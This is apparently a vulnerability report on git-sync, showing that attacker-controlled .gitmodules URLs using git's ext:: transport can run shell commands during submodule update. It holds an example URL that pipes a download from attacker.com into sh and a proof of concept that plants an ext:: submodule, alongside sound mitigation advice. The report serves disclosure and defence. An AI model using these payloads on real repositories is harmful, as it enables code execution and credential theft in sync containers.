### Title
Untrusted `.gitmodules` submodule URLs can achieve command execution via git's `ext::` protocol - (File: main.go)

### Summary
The Node.js report demonstrates a class of bug where a security boundary (Permission Policy's module allow-list) can be bypassed because an unprivileged/attacker-influenced code path (`process.mainModule.require`) is not covered by the restriction. The equivalent pattern in `git-sync` is that `git-sync`'s core promise — it only reads/fetches a remote repository into `--root` and never executes attacker content — is not actually enforced for submodule fetches. Submodule URLs come from `.gitmodules`, which is part of the synced repository content and therefore fully attacker-controlled (any user who can push to the synced repo/ref). `git-sync` runs `git submodule update --init [--recursive]` directly against the checked-out worktree without restricting the allowed git transport/protocol.

### Finding Description
`configureWorktree` unconditionally executes submodule update whenever `git.submodules != submodulesOff` (the default is `recursive`): [1](#0-0) 

This runs `git submodule update --init [--recursive] [--depth N]` in the worktree directory. Git submodule URLs are read from `.gitmodules`, a file that is part of the tracked repository content and thus fully controlled by whoever can push a commit or ref to the synced repo. Git supports the `ext::` transport helper, which invokes an arbitrary shell command as the "clone" mechanism (e.g. `ext::sh -c "id > /tmp/pwn; git upload-pack .`). If an attacker adds a submodule entry such as:
```
[submodule "x"]
    path = x
    url = ext::sh -c "curl attacker.com/x|sh"
```
and pushes it to the repository being synced, `git submodule update --init` will invoke that command during `configureWorktree`, achieving code execution in the git-sync container.

I found no evidence in `main.go` of `GIT_ALLOW_PROTOCOL` being set, nor of `protocol.ext.allow=never`/`protocol.file.allow=never` being configured for the runner's git invocations; such settings only appear in `test_e2e.sh` test harness setup (e.g. `protocol.file.allow=always` used to explicitly enable local-path submodules for test fixtures), not in production code paths. [2](#0-1) 

This mirrors the reported bug class precisely: a supposedly-scoped operation (fetching/checking out an explicitly permitted repo) has an alternate, unchecked path (`.gitmodules`-driven submodule fetch using arbitrary git transports) that is outside the intended trust boundary, just as `process.mainModule.require` was an unchecked path around Permission Policy's module allow-list.

### Impact Explanation
Successful exploitation yields arbitrary command execution inside the `git-sync` container/sidecar, running with whatever privileges the container has (potentially including mounted credentials, service account tokens, or network access to internal services). This satisfies the "code execution" acceptance criterion. Because `git-sync` is commonly deployed as a privileged-adjacent sidecar with access to shared volumes and sometimes credentials for further git operations (SSH keys, HTTP credentials, askpass URLs), this could lead to credential/token disclosure or further lateral movement.

### Likelihood Explanation
Likelihood is high wherever `--submodules` is not set to `off` (the CLI default is `recursive`) and the synced repository/ref is writable by an untrusted or lower-privileged party (a very common scenario for git-sync: syncing a shared or multi-tenant GitOps repo, or syncing a ref that includes third-party PR/branch content). No additional flags are required beyond the default configuration; the attacker only needs push access to a branch/tag/commit that `git-sync` is configured to follow.

### Recommendation
- Explicitly restrict allowed git transports for all invoked git commands (and especially submodule operations) by setting `GIT_ALLOW_PROTOCOL` (or `protocol.allow`/`protocol.<type>.allow=never` for `ext`, and ideally also `file`) in the runner's environment/config before running `git submodule update`.
- Consider documenting/enforcing that `--submodules=off` is the safer default when syncing from repos with untrusted contributors, and add a flag to explicitly allow/deny submodule URL schemes.
- Add e2e regression tests that verify `ext::`-based submodule URLs are rejected.

### Proof of Concept
1. In the source repo being synced, add a submodule with a malicious URL:
```
git submodule add 'ext::sh -c "touch /tmp/pwned; git upload-pack ."' evil
git commit -am "add malicious submodule"
git push
```
2. Run `git-sync` against this repo with default flags (submodules default to `recursive`):
```
git-sync --repo=<attacker-controlled-repo> --root=/tmp/root --link=link
```
3. Observe that during `configureWorktree`'s submodule update step, the `ext::` command is executed, creating `/tmp/pwned` inside the git-sync process/container. [1](#0-0)
